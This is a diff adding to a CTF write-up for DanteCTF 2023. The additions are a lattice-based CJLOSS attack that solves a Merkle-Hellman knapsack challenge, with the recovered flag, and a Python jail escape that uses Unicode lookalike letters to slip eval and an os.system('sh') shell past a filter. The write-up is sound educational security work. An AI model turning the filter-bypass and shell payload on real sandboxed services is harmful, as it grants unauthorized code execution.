@@ -3,6 +3,7 @@ title: "DanteCTF by Born2Scan"
 date: 2023-06-04T00:04:57-04:00
 categories: [ctf, writeup, signals]
 tags: [aprs, gqrx, knapsack]
+math: true
 cover:
     image: DanteCTF2.png
 ---
@@ -52,7 +53,7 @@ So, we examine one of the packets of the IPv6 traffic.  There are two fields tha
 
 We will extract these two fields and store them in a file for further processing. 
 ```bash
-    $ tshark -r RoutesMarkTheSpot.pcapng -T fields -e ipv6.flow -e data -Y ipv6 
+    $ tshark -r RoutesMarkTheSpot.pcapng -T fields -e ipv6.flow -e data -Y ipv6  > ipv6.txt
 
     0x00001e	3479434b36463078457333766b30535259413374307354514b4  ...
     0x00001a	71376b53496774614f304169623467424e6b4754464e6b795a4  ...
@@ -160,6 +161,153 @@ We are given an STL file of a christmas tree ornament. Examining the inside of t
 #### Adventurer's Knapsack
 `For every good trip in the afterworld you need a good knapsack!`
 
+I did not solve this problem during the CTF. It is quite an interesting challenge and led me down several paths of investigating the vulnerabilities of Merkle_Hellman cryptography system.
+
+The problem is succinctly captured in a small sage script that I have annotated below:
+
+```python
+    from SECRET import flag, privk, m, n
+    from sage.numerical.knapsack import Superincreasing
+    # Superincreasing is a series in which each item is larger than the sum of all previous items.
+
+    flag_int=bytes_to_long(flag)
+    L=len(flag)*8
+    assert L==176       #Flag is 176 bits 
+
+    # This is an implementation of Merkle_Hellman cryptography system with random shuffling
+    assert Superincreasing(privk).is_superincreasing()  # private key is a superincreasing series
+    assert m > sum(privk)   # m is larger than the sum, i.e larger than the last element
+    assert gcd(n,m) == 1    # m and n are co-prime, hence n is invertible
+
+    pubk= [(n*i)%m for i in privk]  # Obfuscate the private keys using modulo-m
+    shuffle(pubk)               # Random shuffling of the public keys to mask it further
+
+    ct=0
+    for i in range(L):
+        if flag_int & 2^(L-i-1) != 0:   # if the bit is 1, add the corresponding element to the ciphertext
+            ct += pubk[i]
+
+    print(f'{ct=}')     # share the cipher text and the public key array
+    print(f'{pubk=}')
+```
+So, we are given a numeric representation of the cipher text and a randomly shuffled array of public keys - which are derived from a superincreasing series of private keys. 
+
+So, the ciphertext  \\(ct = \\sum_1^n b_i * P_i\\), where \\(b_i\\) is the bit value at position `i` and \\(P_i\\) is the corresponding public key value in the shuffled array. 
+
+So, deriving the bitstream need us to find the values of \\(b_i\\) given the values of \\(ct\\) and \\(P_i\\).
+
+There are two general methods to solve this problem. 
+1. [Lenstra–Lenstra–Lovász (LLL) lattice basis reduction](https://en.wikipedia.org/wiki/Lenstra%E2%80%93Lenstra%E2%80%93Lov%C3%A1sz_lattice_basis_reduction_algorithm).  
+1. [Low Density attack on low-density knapsacks](https://static.aminer.org/pdf/PDF/000/119/853/solving_low_density_knapsacks.pdf). 
+
+Low Density Attack 
+
+For a given set of positive integers `A = {a_1, . . . , a_n} (a_i != a_j)` and a given positive integer `s`,
+determining whether there exists a subset of `A` with its sum being `s`, or finding a vector
+`e = (e_1, . . . , e_n) ∈ {0, 1}^n` satisfying `Σ_{i=1}^n a_i·e_i = s`, is called the subset sum problem
+(or the knapsack problem), and is known as an NP-hard problem in general.
+
+Low-density attack is a method which works effectively against subset sum problems with low density.
+The density of the subset sum problem `d` is defined by \\(d = \\dfrac{N}{\\log_2 max(a_i)}\\).
+
+There are two well-known algorithms:
+- Lagarias and Odlyzko (LO) algorithm (works on `d < 0.6463`)
+- Coster, Joux, LaMacchia, Odlyzko, Schnorr, and Stern (CJLOSS) algorithm (works on `d < 0.9408`)
+
+I was not able to solve the problem using LLL method. After the CTF, I was able to apply the CJLOSS algorithm to solve the challenge and get the flag. The implementation was borrowed from Hyunsik Jeong's [excellent GitHub site](https://github.com/hyunsikjeong/LLL).
+
+
+```python
+class HighDensityException(Exception):
+    pass
+
+class CJLOSSAttack:
+    def __init__(self, array, target_sum, try_on_high_density=False):
+        self.array = array
+        self.n = len(self.array)
+        self.target_sum = target_sum
+        self.density = self._calc_density()
+        self.try_on_high_density = try_on_high_density
+
+    def _calc_density(self):
+        return self.n / log(max(self.array), 2)
+
+    def _check_ans(self, ans):
+        calc_sum = sum(map(lambda x: x[0] * x[1], zip(self.array, ans)))
+        return self.target_sum == calc_sum
+
+    def solve(self):
+        if self.density >= 0.9408 and not self.try_on_high_density:
+            raise HighDensityException()
+
+        # 1. Initialize Lattice
+        L = Matrix(ZZ, self.n + 1, self.n + 1)
+        N = ceil(self.n ^ 0.5 / 2)
+        for i in range(self.n + 1):
+            for j in range(self.n + 1):
+                if j == self.n and i < self.n:
+                    L[i, j] = 2 * N * self.array[i]
+                elif j == self.n:
+                    L[i, j] = 2 * N * self.target_sum
+                elif i == j:
+                    L[i, j] = 2
+                elif i == self.n:
+                    L[i, j] = 1
+                else:
+                    L[i, j] = 0
+
+        # 2. LLL!
+        B = L.LLL()
+
+        # 3. Find answer
+        for i in range(self.n + 1):
+            if B[i, self.n] != 0:
+                continue
+
+            if all(v == -1 or v == 1 for v in B[i][:self.n]):
+                ans = [ (-B[i, j] + 1) // 2 for j in range(self.n)]
+                if self._check_ans(ans):
+                    return ans
+
+        # Failed to find answer
+        return None
+
+# Example
+if __name__ == "__main__":
+    ct = 134386949562122693902447468860044804076193605907011732452713809
+    pubKey = [ ... ]
+
+    attack = CJLOSSAttack(pubKey, ct, True)
+    ans = attack.solve()
+    if ans is None: 
+        print("CJLOSS: No solution")
+    else:
+        bitstr = ''.join(str(x) for x in ans)
+        print("CJLOSS:", bitstr)
+        print("CJLOSS:", ''.join(chr(int(bitstr[i:i+8],2)) for i in range(0, len(bitstr), 8)))
+```
+
+Flag: `DANTE{kN4ps4ck_w_l0w_d3NS1ty}`
+
+#### HellJail
+
+```python
+# from the writeups - @AbuQasem
+import string,sys
+
+fake_alphabet = "𝔞 𝔟 𝔠 𝔡 𝔢 𝔣 𝔤 𝔥 𝔦 𝔧 𝔨 𝔩 𝔪 𝔫 𝔬 𝔭 𝔮 𝔯 𝔰 𝔱 𝔲 𝔳 𝔴 𝔵 𝔶 𝔷".split(" ")
+real_alphabet = string.ascii_lowercase
+trans = str.maketrans("".join(real_alphabet), "".join(fake_alphabet))
+
+code = sys.argv[1]
+converted_code = code.translate(trans)
+
+print(converted_code)
+
+# python3 exploit.py "eval(input('x '))"
+# __import__('os').system('sh')
+# cat flag.txt
+```
 
 ### Resources
 * http://www.aprs.org/iss-aprs/issicons.html
@@ -168,6 +316,7 @@ We are given an STL file of a christmas tree ornament. Examining the inside of t
 * https://github.com/BlackVS/Awesome-CTS
 * https://crypto.stackexchange.com/questions/50068/how-to-attack-merkle-hellman-cryptosystem-if-the-first-element-in-the-superincre
 * http://www.cs.sjsu.edu/faculty/stamp/papers/topics/topic16/Knapsack.pdf
+
 
 
 ### List
